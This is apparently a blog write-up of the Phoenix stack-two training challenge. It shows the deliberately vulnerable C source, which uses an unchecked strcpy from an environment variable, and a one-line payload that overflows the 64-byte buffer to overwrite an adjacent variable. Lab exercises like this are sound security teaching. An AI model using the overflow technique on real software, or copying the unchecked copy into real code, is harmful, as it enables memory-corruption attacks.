---
title: Phoenix - stack_two
date: 2026-05-30 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix stack_two challenge
toc: true
---

## Introduction
I will be explaining how i did the challenge stack_two from the series Phoenix found at <https://exploit.education/phoenix/stack-two/>

## Step one 
Before debugging it, i will inspect the provided source code
```
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}

```

This is similar to the previous challenge except that `buffer` gets it value from the environment variable `ExploitEducation`. The plan is simple, set the environment variable in a way that it overflows causing the value of `changeme` to be altered. 

## Step two
The following command was used to set the environment variable `ExploitEducation`:

```
export ExploitEducation=$(python -c 'print("A"*64+"\x0a\x09\x0a\x0d")')
```

![](assets/posts/PWN/phoenix_stack_two/flag.png)

